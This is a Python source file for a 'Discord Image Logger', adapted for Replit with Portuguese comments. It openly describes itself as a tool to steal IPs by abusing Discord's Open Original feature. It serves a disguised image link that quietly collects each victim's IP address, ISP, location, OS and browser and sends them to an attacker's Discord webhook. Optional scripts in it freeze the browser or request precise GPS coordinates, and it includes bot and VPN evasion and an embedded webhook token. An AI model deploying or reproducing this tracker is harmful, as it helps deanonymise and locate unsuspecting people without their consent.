# Discord Image Logger
# Adaptado para Replit

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
    "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg", # Você também pode usar uma imagem personalizada usando um argumento de URL
                                               # (Ex. seusite.com/imagelogger?url=<Insira um link para uma imagem aqui>)
    "imageArgument": True, # Permite usar um argumento de URL para mudar a imagem (VEJA O README)

    # CUSTOMIZAÇÃO #
    "username": "Image Logger", # Defina o nome que você quer que o webhook tenha
    "color": 0x00FFFF, # Cor Hex que você quer para o embed (Exemplo: Vermelho é 0xFF0000)

    # OPÇÕES #
    "crashBrowser": False, # Tenta travar/congelar o navegador do usuário, pode não funcionar.
    
    "accurateLocation": False, # Usa GPS para encontrar a localização exata do usuário (Endereço real, etc.) desativado porque pede ao usuário, o que pode ser suspeito.

    "message": { # Mostra uma mensagem personalizada quando o usuário abre a imagem
        "doMessage": False, # Ativar a mensagem personalizada?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Mensagem para mostrar
        "richMessage": True, # Ativar texto rico? (Veja o README para mais informações)
    },

    "vpnCheck": 1, # Evita que VPNs acionem o alerta
                # 0 = Sem Anti-VPN
                # 1 = Não pingar quando uma VPN for suspeita
                # 2 = Não enviar um alerta quando uma VPN for suspeita

    "linkAlerts": True, # Alerta quando alguém envia o link (Pode não funcionar se o link for enviado várias vezes em poucos minutos)
    "buggedImage": True, # Mostra uma imagem de carregamento como pré-visualização quando enviada no Discord (Pode aparecer como uma imagem colorida aleatória em alguns dispositivos)

    "antiBot": 1, # Evita que bots acionem o alerta
                # 0 = Sem Anti-Bot
                # 1 = Não pingar quando possivelmente for um bot
                # 2 = Não pingar quando com certeza for um bot
                # 3 = Não enviar um alerta quando possivelmente for um bot
                # 4 = Não enviar um alerta quando com certeza for um bot
    

    # REDIRECIONAMENTO #
    "redirect": {
        "redirect": False, # Redirecionar para uma página da web?
        "page": "https://your-link.here" # Link para a página da web para redirecionar
    },
}

blacklistedIPs = ("27", "104", "143", "164") # IPs na lista negra. Você pode inserir um IP completo ou o início para bloquear um bloco inteiro.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Não enviar um alerta se o usuário tiver desativado
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                if info.get("proxy", False):
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                return

            if config["antiBot"] == 2:
                if info.get("proxy", False):
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                ping = ""

        os, browser = "Unknown", "Unknown"
        if useragent:
            try:
                os, browser = httpagentparser.simple_detect(useragent)
            except:
                pass
        
        embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

    **Endpoint:** `{endpoint}`
                
    **IP Info:**
    > **IP:** `{ip if ip else 'Unknown'}`
    > **Provider:** `{info.get('isp', 'Unknown')}`
    > **ASN:** `{info.get('as', 'Unknown')}`
    > **Country:** `{info.get('country', 'Unknown')}`
    > **Region:** `{info.get('regionName', 'Unknown')}`
    > **City:** `{info.get('city', 'Unknown')}`
    > **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
    > **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', 'Unknown') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', 'Unknown') else 'Unknown'})`
    > **Mobile:** `{info.get('mobile', 'Unknown')}`
    > **VPN:** `{info.get('proxy', 'Unknown')}`
    > **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

    **PC Info:**
    > **OS:** `{os}`
    > **Browser:** `{browser}`

    **User Agent:**
    ```
    {useragent}
    ```""",
        }
      ],
    }
        
        if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json = embed)
        return info
    except Exception as e:
        print(f"Error making report: {e}")
        return None

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            ip = self.headers.get('x-forwarded-for')
            if not ip:
                ip = self.client_address[0]
                
            if ip and ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define os dados como uma imagem para o Discord mostrar.
                self.end_headers() # Declara os cabeçalhos como finalizados.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Escreve a imagem para o cliente.

                makeReport(ip, endpoint = s.split("?")[0] if '?' in s else s, url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(ip, self.headers.get('user-agent'), location, s.split("?")[0] if '?' in s else s, url = url)
                    except:
                        result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0] if '?' in s else s, url = url)
                else:
                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0] if '?' in s else s, url = url)
                
                message = config["message"]["message"]

                if result and config["message"]["richMessage"]:
                    message = message.replace("{ip}", ip or "Unknown")
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in result.get('timezone', 'Unknown') else 'Unknown'} ({result.get('timezone', 'Unknown').split('/')[0] if '/' in result.get('timezone', 'Unknown') else 'Unknown'})")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting", False) and not result.get("proxy", False) else 'Possibly' if result.get("hosting", False) else 'False'))
                    
                    try:
                        os_info, browser_info = httpagentparser.simple_detect(self.headers.get('user-agent', ''))
                        message = message.replace("{browser}", browser_info)
                        message = message.replace("{os}", os_info)
                    except:
                        message = message.replace("{browser}", "Unknown")
                        message = message.replace("{os}", "Unknown")

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define os dados como uma imagem para o Discord mostrar.
                self.end_headers() # Declara os cabeçalhos como finalizados.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

def run():
    server_address = ('', 8080)  # O Replit usa a porta 8080 por padrão
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"{__app__} {__version__} by {__author__}")
    print(f"Servidor rodando na porta 8080...")
    httpd.serve_forever()

# Inicia o servidor quando o script é executado diretamente
if __name__ == '__main__':
    run()
